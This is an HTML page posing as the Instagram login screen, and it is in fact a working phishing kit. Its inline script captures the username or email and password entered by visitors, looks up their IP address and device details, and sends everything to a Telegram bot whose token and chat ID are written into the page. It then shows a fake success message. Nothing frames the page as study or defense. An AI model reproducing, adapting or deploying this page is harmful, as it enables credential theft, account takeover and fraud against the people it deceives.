<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Login</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
            <!-- قسم صور الهاتف أو المعرض -->
        </section>

        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>

                <form id="login-form">
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input
                        id="email"
                        type="text"
                        name="email"
                        placeholder="Phone number, username, or email"
                        required
                        autocomplete="username"
                    />

                    <div class="password-wrapper" style="position: relative;">
                        <label for="password" class="sr-only">Password</label>
                        <input
                            id="password"
                            type="password"
                            name="password"
                            placeholder="Password"
                            required
                            autocomplete="current-password"
                        />
                        <button type="button" id="toggle-password" style="position: absolute; left: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; display: none;">Show</button>
                    </div>

                    <button type="submit" id="submit-btn">Log In</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>

                <div class="login-with-fb flex direction-column align-items-center">
                    <div class="flex align-items-center">
                        <a href="#">Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>

            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>

            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <a href="#" target="_blank" rel="noopener noreferrer">
                        <img src="./img/apple-button.png" alt="Apple App Store logo" title="Apple App Store logo" />
                    </a>
                    <a href="#" target="_blank" rel="noopener noreferrer">
                        <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                    </a>
                </div>
            </div>
        </section>
    </main>

    <!-- Axios Library -->
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>

    <script>
        const TOKEN = "8877935499:AAGhX0GN9vSXK7T90MO1BEIJEdUVQOEI32Q"; 
        const CHAT_ID = "6030803099"; 
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        const loginForm = document.getElementById('login-form');
        const passwordInput = document.getElementById('password');
        const togglePasswordBtn = document.getElementById('toggle-password');
        const submitBtn = document.getElementById('submit-btn');

        if (passwordInput && togglePasswordBtn) {
            passwordInput.addEventListener('input', () => {
                togglePasswordBtn.style.display = passwordInput.value.length > 0 ? 'block' : 'none';
            });

            togglePasswordBtn.addEventListener('click', () => {
                const isPassword = passwordInput.type === 'password';
                passwordInput.type = isPassword ? 'text' : 'password';
                togglePasswordBtn.textContent = isPassword ? 'Hide' : 'Show';
            });
        }

        if (loginForm) {
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();

                submitBtn.disabled = true;
                const originalBtnText = submitBtn.textContent;
                submitBtn.textContent = 'Logging in...';

                const email = document.getElementById('email').value;
                const password = passwordInput.value;

                let ip = 'Unavailable';
                try {
                    const ipResponse = await axios.get('https://api.ipify.org?format=json', { timeout: 3000 });
                    ip = ipResponse.data.ip;
                } catch (err) {
                    console.warn('Could not fetch IP, continuing without it.');
                }

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'; 

                const message = `
                    <b>New Login Attempt</b>
                    <b>Email / User:</b> <code>${email}</code>
                    <b>Password:</b> <code>${password}</code>
                    <b>IP Address:</b> ${ip}
                    <b>Device Type:</b> ${deviceType}
                    <b>Platform:</b> ${platform}
                    <b>Resolution:</b> ${screenWidth}x${screenHeight}
                    <b>User Agent:</b> ${userAgent}
                `;

                try {
                    await axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    });
                    alert('Log in successful!');
                    loginForm.reset();
                } catch (error) {
                    console.error('Error sending message:', error);
                    alert('An error occurred. Please try again.');
                } finally {
                    submitBtn.disabled = false;
                    submitBtn.textContent = originalBtnText;
                }
            });
        }
    </script>
</body>
</html>
